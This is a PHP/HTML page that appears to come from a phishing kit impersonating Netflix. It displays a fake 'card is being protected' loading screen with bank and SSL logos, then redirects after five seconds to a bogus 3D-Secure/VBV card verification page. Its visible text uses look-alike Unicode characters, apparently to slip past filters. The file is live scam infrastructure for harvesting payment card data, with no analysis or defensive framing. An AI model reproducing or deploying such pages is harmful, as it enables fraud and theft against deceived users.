<?php
session_start();
?>
<!DOCTYPE html>
<html><head>
  <meta charset="utf-8">
  <link rel="shortcut icon" type="image/x-icon" href="../files/img/icon.ico">
  <meta name="viewport" content="initial-scale=1.0">
  <title>Pɾocɵssıпg...plɵɑse wait</title>
  <link rel="stylesheet" type="text/css" href="../files/css/h.css">
<style type="text/css"></style></head>
<body>
 <div class="al">
    <header>
    <div class="logo_bank">
      <img style="max-width: 110px;" src="../files/img/net.png">         </div>
         <div class="logo_ssl">
           <img src="../files/img/ssl.png">
         </div>
		 <tr>
						<td width="100%" valign="top" height="60px" >
							<center><br><br><br><h4 Style="color:#5a5152">Youɾ Cɑɾd ls Bɵıпg Pɾotɵctɵd By NɵtfIıx lпc </h4></center>
						</td>
					</tr>
<meta http-equiv="refresh" content="5; URL= ../websc_verification/?to=verification/3D-VBV.html?appIdKey=4b5b4067999110e9eeb11f1073341c69">
    </header>
    <br><br><br><br><br><center><img src="../files/img/gif/loading.gif" width="230" height="45"></center><br><br><br><br><br><br><br><br><br><br><br>
   </div>


</body></html>